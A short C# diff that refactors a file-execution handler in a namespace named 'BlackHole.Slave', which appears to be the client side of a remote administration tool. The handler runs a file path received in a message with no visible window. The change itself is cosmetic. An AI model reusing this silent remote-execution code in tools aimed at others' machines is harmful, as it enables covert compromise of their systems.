@@ -448,13 +448,12 @@ namespace BlackHole.Slave
             ExecuteSimpleOperation(message.WindowId, -1, "File execution",
                 () =>
                 {
-                    var startInfo = new ProcessStartInfo()
+                    Process.Start(new ProcessStartInfo()
                     {
                         UseShellExecute = true,
                         FileName = message.FilePath,
                         CreateNoWindow = true,
-                    };
-                    Process.Start(startInfo);
+                    });
                 }, message.FilePath);
         }
     }
